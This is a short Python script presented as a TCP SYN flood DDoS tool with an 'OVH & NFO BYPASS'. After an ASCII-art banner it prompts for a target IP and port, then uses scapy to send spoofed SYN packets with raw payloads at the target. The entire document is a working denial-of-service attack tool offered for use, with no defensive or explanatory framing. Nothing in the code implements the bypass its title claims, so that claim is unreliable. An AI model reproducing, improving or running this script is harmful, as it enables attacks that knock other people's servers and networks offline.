# TCP SYN FLOOD (OVH & NFO BYPASS)
import socket, threading
import time
import os,sys
from secrets import choice
from threading import Thread
import psutil
import random
from scapy.all import *

os.system("clear")
print("З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")
print('''
    KAZUYA AND TEAM
 
╭╮╭━╮
┃┃┃╭╯
┃╰╯╯╭━━┳━━━┳╮╭┳╮╱╭┳━━╮
┃╭╮┃┃╭╮┣━━┃┃┃┃┃┃╱┃┃╭╮┃
┃┃┃╰┫╭╮┃┃━━┫╰╯┃╰━╯┃╭╮┃
╰╯╰━┻╯╰┻━━━┻━━┻━╮╭┻╯╰╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
                                
''')
print("Ddos©Attaka©Tpc")

time.sleep(2.5)
os.system("clear")
print()
def main():
    count       = 0

    target      = input(" Target IP:=> ")
    target_port = input(" Target Port:=> ")
    data        = input(" Data Рackets/Пакеты:=> ")
    amount      = input(" Amount Packets/Потоки:=> ")

    target_ip   = socket.gethostbyname(target)

    for count in range(int(amount)):
        ip      = IP(src=target_ip, dst=target_ip) 
        tcp     = TCP(sport=RandShort(), dport=int(target_port), flags="S")
        raw     = Raw(data*1024)
        p       = ip / tcp / raw
        send(p, loop=0, verbose=0)
        count   = count + 1

    print("\nTotal packets sent: %i\n" % count)

if __name__ == "__main__":
    t = threading.Timer(1, main, ())
    t.start()
